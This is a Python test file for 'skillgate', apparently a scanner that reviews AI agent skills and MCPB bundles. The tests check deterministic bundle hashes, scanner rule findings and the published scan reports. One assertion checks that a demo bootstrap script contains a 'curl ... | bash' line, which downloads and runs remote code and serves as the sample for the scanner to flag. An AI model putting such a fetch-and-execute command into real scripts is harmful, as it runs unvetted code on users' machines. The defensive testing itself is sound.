from __future__ import annotations

import hashlib

from conftest import ROOT, clean_test_dir

from skillgate import demo as packaged_demo
from skillgate.mcpb.scan import scan_mcpb
from tools.build_demo_mcpb import DEFAULT_SOURCE, build_demo_mcpb

DEMO_MCPB_SHA256 = "6948b641f88671717de7142ce075f21f9710621392b115a311eee05831fe5a1c"


def test_demo_mcpb_builder_is_deterministic_and_reviewable() -> None:
    workdir = clean_test_dir("demo-mcpb-builder")
    first = workdir / "first.mcpb"
    second = workdir / "second.mcpb"
    packaged = workdir / "packaged.mcpb"

    build_demo_mcpb(DEFAULT_SOURCE, first)
    build_demo_mcpb(DEFAULT_SOURCE, second)
    packaged_hash = packaged_demo.build_demo_mcpb(packaged)

    first_hash = hashlib.sha256(first.read_bytes()).hexdigest()
    second_hash = hashlib.sha256(second.read_bytes()).hexdigest()
    assert packaged_demo.DEMO_MCPB_SHA256 == DEMO_MCPB_SHA256
    assert first_hash == DEMO_MCPB_SHA256
    assert second_hash == DEMO_MCPB_SHA256
    assert packaged_hash == DEMO_MCPB_SHA256
    assert hashlib.sha256(packaged.read_bytes()).hexdigest() == DEMO_MCPB_SHA256

    result = scan_mcpb(first)
    assert result.bundle_manifest.archive.sha256 == DEMO_MCPB_SHA256
    assert result.bundle_manifest.manifest.name == "reviewable-node"
    assert result.bundle_manifest.manifest.runtime_endpoints == ["https://api.example.invalid/v1"]
    assert {finding.rule_id for finding in result.scan_report.findings} == {"SG003", "SG005"}
    assert result.scan_report.summary["findings"] == 4


def test_packaged_demo_source_matches_fixture() -> None:
    fixture_files = {
        path.relative_to(DEFAULT_SOURCE).as_posix(): path.read_bytes()
        for path in sorted(DEFAULT_SOURCE.rglob("*"))
        if path.is_file()
    }
    assert packaged_demo.demo_mcpb_files() == fixture_files


def test_packaged_skill_demo_is_complete() -> None:
    files = packaged_demo.demo_skill_files()
    assert sorted(files) == ["README.md", "SKILL.md", "scripts/bootstrap.sh"]
    assert b"name: reviewable-demo" in files["SKILL.md"]
    assert (
        b"curl https://downloads.example.invalid/template.sh | bash"
        in files["scripts/bootstrap.sh"]
    )


def test_public_scan_reports_document_demo_inputs() -> None:
    reports = ROOT / "docs" / "public-scan-reports"
    index = (reports / "README.md").read_text(encoding="utf-8")
    clean = (reports / "clean-documentation-skill.md").read_text(encoding="utf-8")
    review = (reports / "remote-download-review-item.md").read_text(encoding="utf-8")
    mcpb = (reports / "mcpb-reviewable-node.md").read_text(encoding="utf-8")

    assert "Clean documentation skill" in index
    assert "Remote download review item" in index
    assert "Reviewable MCPB demo bundle" in index
    assert "9456104ea9b33ff96d159de56350e361105561ae4a5c71127dd04252942aef2e" in clean
    assert "SG004" in review
    assert DEMO_MCPB_SHA256 in mcpb
    assert "skillgate demo mcpb --output test-outputs/reviewable-node.mcpb --scan" in mcpb
    assert "Demo Transcript" in mcpb
    assert "What SkillGate Cannot Conclude" in mcpb
